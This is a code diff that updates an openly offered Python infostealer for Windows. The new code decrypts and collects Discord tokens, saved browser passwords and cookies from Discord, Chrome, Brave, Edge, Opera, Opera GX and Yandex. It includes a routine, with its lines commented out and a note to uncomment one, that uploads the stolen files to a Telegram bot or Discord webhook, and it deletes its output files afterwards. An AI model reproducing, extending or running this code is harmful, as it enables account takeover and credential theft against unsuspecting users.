@@ -6,31 +6,68 @@ from Cryptodome.Cipher import AES
 import os
 from shutil import copy2
 from requests import post, get
-from re import findall
+import re
 
 fileCookies = "cooks_"+ os.getlogin()+ ".txt"
 filePass = "passes_"+ os.getlogin()+ ".txt"
 fileInfo = "info_" + os.getlogin()+ ".txt"
 
 #DISCORD TOKENS
-def find_tokens(path):
-    path += '\\Local Storage\\leveldb'
+def decrypt_token(buff, master_key):
+    try:
+        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
+    except:
+        pass
 
+
+def get_tokens(path):
+    cleaned = []
     tokens = []
+    done = []
+    levDB = path + "\\Local Storage\\leveldb\\"
+    LocState = path + "\\Local State"
+    #new method with encryption
+    if os.path.exists(LocState):
+        with open(LocState, "r") as file:
+            key = loads(file.read())['os_crypt']['encrypted_key']
+            file.close()
+        for file in os.listdir(levDB):
+            if not file.endswith(".ldb") and file.endswith(".log"):
+                continue
+            else:
+                try:
+                    with open(levDB + file, "r", errors='ignore') as files:
+                        for x in files.readlines():
+                            x.strip()
+                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                tokens.append(values)
+                except PermissionError:
+                    continue
+        for i in tokens:
+            if i.endswith("\\"):
+                i.replace("\\", "")
+            elif i not in cleaned:
+                cleaned.append(i)
+        for token in cleaned:
+            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]
+                
+    else: #old method without encryption
 
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
+        for file_name in os.listdir(path):
+            try:
+                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                    continue
+            
 
-        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                for token in findall(regex, line):
-                    tokens.append(token)
-    f = open(fileInfo, "a")
-    f.write(str(tokens))
-    f.write("\n")
-    f.close()
+                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        for token in re.findall(regex, line):
+                            done.append(token)
 
+            except PermissionError:
+                continue
+
+    return done
 #DECRYPT CIPHERS
 def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)
@@ -42,7 +79,7 @@ def decrypt_payload(cipher, payload):
 def decrypt_browser(LocalState, LoginData, CookiesFile, name):
     
 
-    if os.path.exists(LocalState) == True:
+    if os.path.exists(LocalState):
         with open(LocalState) as f:
             local_state = f.read()
             local_state = loads(local_state)
@@ -50,7 +87,7 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
         master_key = master_key[5:]
         master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
 
-        if os.path.exists(LoginData) == True:
+        if os.path.exists(LoginData):
             copy2(LoginData, "TempMan.db")
             con = connect("TempMan.db")
             cur = con.cursor()
@@ -87,7 +124,7 @@ def decrypt_browser(LocalState, LoginData, CookiesFile, name):
             f.write(name + " Login Data file missing\n")
             f.close()
 ######################################################################
-        if os.path.exists(CookiesFile) == True:
+        if os.path.exists(CookiesFile):
             copy2(CookiesFile, "CookMe.db")
             conn = connect("CookMe.db")
             curr = conn.cursor()
@@ -143,19 +180,38 @@ def Cookies(path):
     Cookies = path + "\\User Data\\Default\\Network\\Cookies"
     return Cookies
 
-if os.path.exists(os.environ['APPDATA'] + "\\Discord") == True:
-    find_tokens(os.environ['APPDATA'] + "\\Discord")
-if os.path.exists(os.environ['APPDATA'] + "\\discordptb") == True:
-    find_tokens(os.environ['APPDATA'] + "\\discordptb")
-if os.path.exists(os.environ['APPDATA'] + "\\discordcanary") == True:
-    find_tokens(os.environ['APPDATA'] + "\\discordcanary")
+local = os.getenv('LOCALAPPDATA')
+roaming = os.getenv('APPDATA')
+        
+paths = {
+    'Discord': roaming + '\\Discord',
+    'Discord Canary': roaming + '\\discordcanary',
+    'Discord PTB': roaming + '\\discordptb',
+    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+    'Opera': roaming + '\\Opera Software\\Opera Stable',
+    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+}
 
-
-
+def main_tokens():
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+        try:
+            tokens = get_tokens(path)
+        except:
+            continue
+        if tokens == []:
+            continue
+        with open(fileInfo, "a") as f: 
+            for i in tokens:
+                f.write(str(i) + "\n")
+            f.close()
+main_tokens()
 #CHROME
 pathChrome = os.environ['LOCALAPPDATA'] + "\\Google\\Chrome"
 
-if os.path.exists(pathChrome) == True:
+if os.path.exists(pathChrome):
     decrypt_browser(Local_State(pathChrome), Login_Data(pathChrome), Cookies(pathChrome), "Chrome") 
 else:
     f = open(fileInfo,"a")
@@ -167,7 +223,7 @@ else:
 #BRAVE
 pathBrave = os.environ['LOCALAPPDATA'] + "\\BraveSoftware\\Brave-Browser"
 
-if os.path.exists(pathBrave) == True:
+if os.path.exists(pathBrave):
     decrypt_browser(Local_State(pathBrave), Login_Data(pathBrave), Cookies(pathBrave), "Brave") 
 else:
     f = open(fileInfo,"a")
@@ -179,7 +235,7 @@ else:
 #EDGE
 pathEdge = os.environ['LOCALAPPDATA'] + "\\Microsoft\\Edge"
 
-if os.path.exists(pathEdge) == True:
+if os.path.exists(pathEdge):
     decrypt_browser(Local_State(pathEdge), Login_Data(pathEdge), Cookies(pathEdge), "Edge") 
 else:
     f = open(fileInfo,"a")
@@ -191,7 +247,7 @@ else:
 #OPERA
 pathOpera = os.environ['APPDATA'] + "\\Opera Software\\Opera Stable"
 
-if os.path.exists(pathOpera) == True:
+if os.path.exists(pathOpera):
     decrypt_browser(pathOpera + "\\Local State", pathOpera + "\\Login Data", pathOpera + "\\Network\\Cookies", "Opera") 
 else:
     f = open(fileInfo,"a")
@@ -202,7 +258,7 @@ else:
 #OPERAGX
 pathOperaGX = os.environ['APPDATA'] + "\\Opera Software\\Opera GX Stable"
 
-if os.path.exists(pathOperaGX) == True:
+if os.path.exists(pathOperaGX):
     decrypt_browser(pathOperaGX + "\\Local State", pathOperaGX + "\\Login Data", pathOperaGX + "\\Cookies", "OperaGX") 
 else:
     f = open(fileInfo,"a")
@@ -216,28 +272,27 @@ else:
 def post_to(file):
     token = "TELEGRAM TOKEN"
     chatid = "TELEGRAM CHATID"
-    webhookurl = "DISCORD WEBHOOK"
-    #remove "#" for whatever you wanna use line 222 = telegram api
-                                          #line 223 = discord webhook
+    webhookurl = "WEBHOOK URL"
+    #remove "#" for whatever you wanna use   telegram api or discord webhook
     #post("https://api.telegram.org/bot" + token + "/sendDocument", data={'chat_id': chatid}, files={'document': open(file, 'rb')})
     #post(webhookurl, files={'files': open(file,'rb')})
 
-if os.path.exists(fileInfo) == True:
+if os.path.exists(fileInfo):
     post_to(fileInfo)
     
-if os.path.exists(filePass) == True:
+if os.path.exists(filePass):
     post_to(filePass)
     
-if os.path.exists(fileCookies) == True:
+if os.path.exists(fileCookies):
     post_to(fileCookies)
 ###
 
 
-if os.path.exists(fileInfo) == True:
+if os.path.exists(fileInfo):
     os.remove(fileInfo)
-if os.path.exists(filePass) == True:
+if os.path.exists(filePass):
     os.remove(filePass)
-if os.path.exists(fileCookies) == True:
+if os.path.exists(fileCookies):
     os.remove(fileCookies)
 
 os.remove("TempMan.db")
